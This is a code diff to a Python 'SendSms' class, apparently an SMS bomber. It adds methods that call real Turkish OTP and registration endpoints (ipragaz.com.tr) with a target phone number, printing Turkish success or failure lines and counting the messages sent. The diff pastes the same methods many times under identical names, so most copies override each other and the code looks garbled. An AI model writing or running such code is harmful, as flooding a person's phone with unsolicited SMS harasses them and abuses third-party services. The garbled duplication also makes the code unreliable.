@@ -557,6 +557,98 @@ class SendSms():
         except:
             print(f"{Fore.LIGHTRED_EX}[-] {Style.RESET_ALL}Başarısız! {self.phone} --> ipapp.ipragaz.com.tr")
             
+                #ipragaz.com.tr
+    def IpraGaz(self):
+        try:
+            url = "https://ipapp.ipragaz.com.tr:443/ipragazmobile/v2/ipragaz-b2c/ipragaz-customer/mobile-register-otp"
+            json={"birthDate": "31/08/1975", "carPlate": "31 ABC 31", "name": "Berke Bas", "otp": "", "phoneNumber": str(self.phone), "playerId": ""}
+            r = requests.post(url, json=json)
+            if (r.json()["phoneNumber"]) == str(self.phone):
+                print(f"{Fore.LIGHTGREEN_EX}[+] {Style.RESET_ALL}Başarılı! {self.phone} --> ipapp.ipragaz.com.tr")
+                self.adet += 15
+            else:
+                raise
+        except:
+            print(f"{Fore.LIGHTRED_EX}[-] {Style.RESET_ALL}Başarısız! {self.phone} --> ipapp.ipragaz.com.tr")
+                #ipragaz.com.tr
+    def IpraGaz(self):
+        try:
+            url = "https://ipapp.ipragaz.com.tr:443/ipragazmobile/v2/ipragaz-b2c/ipragaz-customer/mobile-register-otp"
+            json={"birthDate": "31/08/1975", "carPlate": "31 ABC 31", "name": "Berke Bas", "otp": "", "phoneNumber": str(self.phone), "playerId": ""}
+            r = requests.post(url, json=json)
+            if (r.json()["phoneNumber"]) == str(self.phone):
+                print(f"{Fore.LIGHTGREEN_EX}[+] {Style.RESET_ALL}Başarılı! {self.phone} --> ipapp.ipragaz.com.tr")
+                self.adet += 15
+            else:
+                raise
+        except:
+            print(f"{Fore.LIGHTRED_EX}[-] {Style.RESET_ALL}Başarısız! {self.phone} --> ipapp.ipragaz.com.tr")
+                #ipragaz.com.tr
+    def IpraGaz(self):
+        try:
+            url = "https://ipapp.ipragaz.com.tr:443/ipragazmobile/v2/ipragaz-b2c/ipragaz-customer/mobile-register-otp"
+            json={"birthDate": "31/08/1975", "carPlate": "31 ABC 31", "name": "Berke Bas", "otp": "", "phoneNumber": str(self.phone), "playerId": ""}
+            r = requests.post(url, json=json)
+            if (r.json()["phoneNumber"]) == str(self.phone):
+                print(f"{Fore.LIGHTGREEN_EX}[+] {Style.RESET_ALL}Başarılı! {self.phone} --> ipapp.ipragaz.com.tr")
+                self.adet += 15
+            else:
+                raise
+        except:
+            print(f"{Fore.LIGHTRED_EX}[-] {Style.RESET_ALL}Başarısız! {self.phone} --> ipapp.ipragaz.com.tr")
+                #ipragaz.com.tr
+    def IpraGaz(self):
+        try:
+            url = "https://ipapp.ipragaz.com.tr:443/ipragazmobile/v2/ipragaz-b2c/ipragaz-customer/mobile-register-otp"
+            json={"birthDate": "31/08/1975", "carPlate": "31 ABC 31", "name": "Berke Bas", "otp": "", "phoneNumber": str(self.phone), "playerId": ""}
+            r = requests.post(url, json=json)
+            if (r.json()["phoneNumber"]) == str(self.phone):
+                print(f"{Fore.LIGHTGREEN_EX}[+] {Style.RESET_ALL}Başarılı! {self.phone} --> ipapp.ipragaz.com.tr")
+                self.adet += 15
+            else:
+                raise
+        except:
+            print(f"{Fore.LIGHTRED_EX}[-] {Style.RESET_ALL}Başarısız! {self.phone} --> ipapp.ipragaz.com.tr")
+                #ipragaz.com.tr
+    def IpraGaz(self):
+        try:
+            url = "https://ipapp.ipragaz.com.tr:443/ipragazmobile/v2/ipragaz-b2c/ipragaz-customer/mobile-register-otp"
+            json={"birthDate": "31/08/1975", "carPlate": "31 ABC 31", "name": "Berke Bas", "otp": "", "phoneNumber": str(self.phone), "playerId": ""}
+            r = requests.post(url, json=json)
+            if (r.json()["phoneNumber"]) == str(self.phone):
+                print(f"{Fore.LIGHTGREEN_EX}[+] {Style.RESET_ALL}Başarılı! {self.phone} --> ipapp.ipragaz.com.tr")
+                self.adet += 15
+            else:
+                raise
+        except:
+            print(f"{Fore.LIGHTRED_EX}[-] {Style.RESET_ALL}Başarısız! {self.phone} --> ipapp.ipragaz.com.tr")
+                #ipragaz.com.tr
+    def IpraGaz(self):
+        try:
+            url = "https://ipapp.ipragaz.com.tr:443/ipragazmobile/v2/ipragaz-b2c/ipragaz-customer/mobile-register-otp"
+            json={"birthDate": "31/08/1975", "carPlate": "31 ABC 31", "name": "Berke Bas", "otp": "", "phoneNumber": str(self.phone), "playerId": ""}
+            r = requests.post(url, json=json)
+            if (r.json()["phoneNumber"]) == str(self.phone):
+                print(f"{Fore.LIGHTGREEN_EX}[+] {Style.RESET_ALL}Başarılı! {self.phone} --> ipapp.ipragaz.com.tr")
+                self.adet += 15
+            else:
+                raise
+        except:
+            print(f"{Fore.LIGHTRED_EX}[-] {Style.RESET_ALL}Başarısız! {self.phone} --> ipapp.ipragaz.com.tr")
+                #ipragaz.com.tr
+    def IpraGaz(self):
+        try:
+            url = "https://ipapp.ipragaz.com.tr:443/ipragazmobile/v2/ipragaz-b2c/ipragaz-customer/mobile-register-otp"
+            json={"birthDate": "31/08/1975", "carPlate": "31 ABC 31", "name": "Berke Bas", "otp": "", "phoneNumber": str(self.phone), "playerId": ""}
+            r = requests.post(url, json=json)
+            if (r.json()["phoneNumber"]) == str(self.phone):
+                print(f"{Fore.LIGHTGREEN_EX}[+] {Style.RESET_ALL}Başarılı! {self.phone} --> ipapp.ipragaz.com.tr")
+                self.adet += 15
+            else:
+                raise
+        except:
+            print(f"{Fore.LIGHTRED_EX}[-] {Style.RESET_ALL}Başarısız! {self.phone} --> ipapp.ipragaz.com.tr")
+            
              
     #mogazmobilapinew.aygaz.com.tr
     def Mogaz(self):#yıldırımlord#4444
@@ -574,6 +666,105 @@ class SendSms():
             
             
     #ipragaz.com.tr
+    def GoMobile(self):
+        try:
+            r = requests.get(f"https://gomobilapp.ipragaz.com.tr:443/api/v1/0/authentication/sms/send?phone={self.phone}&isRegistered=true")
+            if (r.json()["data"]["success"]) == True:
+                print(f"{Fore.LIGHTGREEN_EX}[+] {Style.RESET_ALL}Başarılı! {self.phone} --> gomobilapp.ipragaz.com.tr")
+                self.adet += 15
+            else:
+                raise
+        except:
+            print(f"{Fore.LIGHTRED_EX}[-] {Style.RESET_ALL}Başarısız! {self.phone} --> gomobilapp.ipragaz.com.tr")
+              #ipragaz.com.tr
+    def GoMobile(self):
+        try:
+            r = requests.get(f"https://gomobilapp.ipragaz.com.tr:443/api/v1/0/authentication/sms/send?phone={self.phone}&isRegistered=true")
+            if (r.json()["data"]["success"]) == True:
+                print(f"{Fore.LIGHTGREEN_EX}[+] {Style.RESET_ALL}Başarılı! {self.phone} --> gomobilapp.ipragaz.com.tr")
+                self.adet += 15
+            else:
+                raise
+        except:
+            print(f"{Fore.LIGHTRED_EX}[-] {Style.RESET_ALL}Başarısız! {self.phone} --> gomobilapp.ipragaz.com.tr")
+              #ipragaz.com.tr
+    def GoMobile(self):
+        try:
+            r = requests.get(f"https://gomobilapp.ipragaz.com.tr:443/api/v1/0/authentication/sms/send?phone={self.phone}&isRegistered=true")
+            if (r.json()["data"]["success"]) == True:
+                print(f"{Fore.LIGHTGREEN_EX}[+] {Style.RESET_ALL}Başarılı! {self.phone} --> gomobilapp.ipragaz.com.tr")
+                self.adet += 15
+            else:
+                raise
+        except:
+            print(f"{Fore.LIGHTRED_EX}[-] {Style.RESET_ALL}Başarısız! {self.phone} --> gomobilapp.ipragaz.com.tr")
+              #ipragaz.com.tr
+    def GoMobile(self):
+        try:
+            r = requests.get(f"https://gomobilapp.ipragaz.com.tr:443/api/v1/0/authentication/sms/send?phone={self.phone}&isRegistered=true")
+            if (r.json()["data"]["success"]) == True:
+                print(f"{Fore.LIGHTGREEN_EX}[+] {Style.RESET_ALL}Başarılı! {self.phone} --> gomobilapp.ipragaz.com.tr")
+                self.adet += 15
+            else:
+                raise
+        except:
+            print(f"{Fore.LIGHTRED_EX}[-] {Style.RESET_ALL}Başarısız! {self.phone} --> gomobilapp.ipragaz.com.tr")
+              #ipragaz.com.tr
+    def GoMobile(self):
+        try:
+            r = requests.get(f"https://gomobilapp.ipragaz.com.tr:443/api/v1/0/authentication/sms/send?phone={self.phone}&isRegistered=true")
+            if (r.json()["data"]["success"]) == True:
+                print(f"{Fore.LIGHTGREEN_EX}[+] {Style.RESET_ALL}Başarılı! {self.phone} --> gomobilapp.ipragaz.com.tr")
+                self.adet += 15
+            else:
+                raise
+        except:
+            print(f"{Fore.LIGHTRED_EX}[-] {Style.RESET_ALL}Başarısız! {self.phone} --> gomobilapp.ipragaz.com.tr")
+              #ipragaz.com.tr
+    def GoMobile(self):
+        try:
+            r = requests.get(f"https://gomobilapp.ipragaz.com.tr:443/api/v1/0/authentication/sms/send?phone={self.phone}&isRegistered=true")
+            if (r.json()["data"]["success"]) == True:
+                print(f"{Fore.LIGHTGREEN_EX}[+] {Style.RESET_ALL}Başarılı! {self.phone} --> gomobilapp.ipragaz.com.tr")
+                self.adet += 15
+            else:
+                raise
+        except:
+            print(f"{Fore.LIGHTRED_EX}[-] {Style.RESET_ALL}Başarısız! {self.phone} --> gomobilapp.ipragaz.com.tr")
+              #ipragaz.com.tr
+    def GoMobile(self):
+        try:
+            r = requests.get(f"https://gomobilapp.ipragaz.com.tr:443/api/v1/0/authentication/sms/send?phone={self.phone}&isRegistered=true")
+            if (r.json()["data"]["success"]) == True:
+                print(f"{Fore.LIGHTGREEN_EX}[+] {Style.RESET_ALL}Başarılı! {self.phone} --> gomobilapp.ipragaz.com.tr")
+                self.adet += 15
+            else:
+                raise
+        except:
+            print(f"{Fore.LIGHTRED_EX}[-] {Style.RESET_ALL}Başarısız! {self.phone} --> gomobilapp.ipragaz.com.tr")
+              #ipragaz.com.tr
+    def GoMobile(self):
+        try:
+            r = requests.get(f"https://gomobilapp.ipragaz.com.tr:443/api/v1/0/authentication/sms/send?phone={self.phone}&isRegistered=true")
+            if (r.json()["data"]["success"]) == True:
+                print(f"{Fore.LIGHTGREEN_EX}[+] {Style.RESET_ALL}Başarılı! {self.phone} --> gomobilapp.ipragaz.com.tr")
+                self.adet += 15
+            else:
+                raise
+        except:
+            print(f"{Fore.LIGHTRED_EX}[-] {Style.RESET_ALL}Başarısız! {self.phone} --> gomobilapp.ipragaz.com.tr")
+              #ipragaz.com.tr
+    def GoMobile(self):
+        try:
+            r = requests.get(f"https://gomobilapp.ipragaz.com.tr:443/api/v1/0/authentication/sms/send?phone={self.phone}&isRegistered=true")
+            if (r.json()["data"]["success"]) == True:
+                print(f"{Fore.LIGHTGREEN_EX}[+] {Style.RESET_ALL}Başarılı! {self.phone} --> gomobilapp.ipragaz.com.tr")
+                self.adet += 15
+            else:
+                raise
+        except:
+            print(f"{Fore.LIGHTRED_EX}[-] {Style.RESET_ALL}Başarısız! {self.phone} --> gomobilapp.ipragaz.com.tr")
+              #ipragaz.com.tr
     def GoMobile(self):
         try:
             r = requests.get(f"https://gomobilapp.ipragaz.com.tr:443/api/v1/0/authentication/sms/send?phone={self.phone}&isRegistered=true")
